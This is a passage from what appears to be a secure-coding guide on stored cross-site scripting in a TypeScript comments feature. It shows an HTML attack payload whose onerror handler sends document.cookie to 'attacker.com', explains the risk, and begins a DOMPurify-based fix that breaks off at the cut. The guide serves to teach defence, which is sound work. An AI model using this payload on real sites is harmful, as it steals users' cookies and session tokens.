**Attack Payload** (if applicable):
```html
<img src=x onerror="fetch('https://attacker.com/steal?cookie=' + document.cookie)">
```

**Why This Is Dangerous**:
- Untrusted HTML is inserted directly into the DOM using `innerHTML`, allowing arbitrary script execution.
- An attacker can exfiltrate cookies, session tokens, CSRF tokens, or perform actions on behalf of the victim.
- Stored XSS (saved in backend and rendered to many users) can impact all visitors, including admins.

**SECURE VERSION**:

```typescript
// src/secure-comments.ts

import DOMPurify from 'dompurify';

interface Comment {
  id: number;
  author: string;
  content: string; // untrusted HTML from users
}

const commentsContainer = document.getElementById('comments-secure');

